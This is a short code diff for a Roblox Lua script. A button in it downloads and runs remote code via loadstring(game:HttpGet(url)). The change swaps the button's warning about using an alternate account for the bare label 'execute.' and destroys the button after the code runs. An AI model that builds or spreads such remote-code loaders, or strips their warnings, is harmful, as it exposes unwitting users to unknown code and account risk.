@@ -7,7 +7,7 @@ screenGui.Parent = playerGui
 local button = Instance.new("TextButton")
 button.Size = UDim2.new(0, 200, 0, 50)
 button.Position = UDim2.new(0.5, -100, 0.5, -25)
-button.Text = "Heads Up! Only click this button after ensuring you're on an alt. This will execute the script."
+    button.Text = "execute."
 button.Parent = screenGui
 
 local function executeCode()
@@ -15,6 +15,7 @@ local function executeCode()
     local success, err = pcall(function()
         loadstring(game:HttpGet(url))()
     end)
+    button:Destroy()
     
     if not success then
         warn("Error executing script: "..err)
